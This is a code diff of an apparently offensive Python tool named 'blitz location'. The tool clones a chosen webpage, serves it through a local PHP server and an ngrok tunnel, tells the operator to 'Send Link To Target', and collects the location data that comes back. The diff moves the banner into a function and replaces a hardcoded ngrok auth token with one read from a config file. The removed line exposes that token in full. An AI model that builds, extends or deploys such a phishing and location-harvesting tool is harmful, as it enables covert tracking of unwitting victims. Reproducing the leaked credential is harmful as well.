@@ -11,29 +11,32 @@ from urllib.parse import urlparse
 import lxml
 from termcolor import colored
 
-f = Figlet(font='slant')
-print("\n\n")
-print(colored("\t\t\t ⢠⣴⣿⣦⣄","red"))
-print(colored("\t\t\t⠀⡄⠙⣿⣿⣿⣦⠀","red"))
-print(colored("\t\t\t⢰⣷⣾⣿⣿⣿⡟","red"))
-print(colored("\t\t\t⠈⠋ ⣿⣿⣿⢄","red"))
-print(colored("\t\t\t  ⣼⣿⣿⣿⡓⣄⠀","red"))
-print(colored("\t\t\t ⡈⣿⣿⣿⣿⡿⠂⠈⠀","red"))
-print(colored("\t\t\t⠀ ⣇⠛⢿⣿⣯⠀","red"))
-print(colored("\t\t\t⠀⠀  ⣿⣿⠀","red"))
-print(colored("\t\t\t  ⣀⣼⣿⠀","red"))
-print(colored("\t\t\t⣾⣿⣿⣿⣿⣿⣷⣤⠀⠀","green"))
-print(colored("\t\t\t⠋⠋⠋⠋⠋⠋⠋⠋⠋⠀","green"))
-print(colored(f.renderText("blitz location"),"green"))
-print(colored("                                               developed by mmk","red"))
-print(colored("                                               version 1.0","red"))
-print("\n\n")
+def banner():
+	f = Figlet(font='slant')
+	print("\n\n")
+	print(colored("\t\t\t ⢠⣴⣿⣦⣄","red"))
+	print(colored("\t\t\t⠀⡄⠙⣿⣿⣿⣦⠀","red"))
+	print(colored("\t\t\t⢰⣷⣾⣿⣿⣿⡟","red"))
+	print(colored("\t\t\t⠈⠋ ⣿⣿⣿⢄","red"))
+	print(colored("\t\t\t  ⣼⣿⣿⣿⡓⣄⠀","red"))
+	print(colored("\t\t\t ⡈⣿⣿⣿⣿⡿⠂⠈⠀","red"))
+	print(colored("\t\t\t⠀ ⣇⠛⢿⣿⣯⠀","red"))
+	print(colored("\t\t\t⠀⠀  ⣿⣿⠀","red"))
+	print(colored("\t\t\t  ⣀⣼⣿⠀","red"))
+	print(colored("\t\t\t⣾⣿⣿⣿⣿⣿⣷⣤⠀⠀","green"))
+	print(colored("\t\t\t⠋⠋⠋⠋⠋⠋⠋⠋⠋⠀","green"))
+	print(colored(f.renderText("blitz location"),"green"))
+	print(colored("                                               developed by mmk","red"))
+	print(colored("                                               version 1.0","red"))
+	print("\n\n")
+	print(colored("\tPlease run program with admin privilege","blue"))
+	print("\n")
 
 def deafult_server():
 	with open("logs/location_log.log","w") as deafult:
 		Popen(('php','-S','localhost:8786'),stdout=deafult,stderr=deafult)
 def clone_webpage():
-	url_to_clone = input("Enter url to clone: ")
+	url_to_clone = input(colored("Enter url to clone: ","green"))
 	clone_html = requests.get(url_to_clone)
 	clone_html = clone_html.text
 	soup = BeautifulSoup(clone_html, 'lxml')
@@ -79,12 +82,25 @@ def recv_loc():
         
 	except:
 		haha = 0
+def ngrok_token_check():
+	n = open('config','r')
+	ngrok_token = n.read()
+	n.close()
+	if not ngrok_token:
+		ngrok_token = input("Enter you ngrok token: ")
+		print("\n\n")
+		p = open("config","w")
+		p.write(ngrok_token)
+	return ngrok_token
 		
+	
 def main():
+	banner()
+	ngrok_token = ngrok_token_check()
 	content = clone_webpage()
 	write_webpage(content)
 	deafult_server()
-	a = ngrok.connect(8786,"http",auth_token="25sYm3hlB2o5yuFK56Cz4TQgw9k_3Ze6sU9FUpDSurUNcUX78")
+	a = ngrok.connect(8786,"http",auth_token=ngrok_token)
 	print(Fore.GREEN+"\n [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
 	print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Please Send Link To Target")
 	while True:
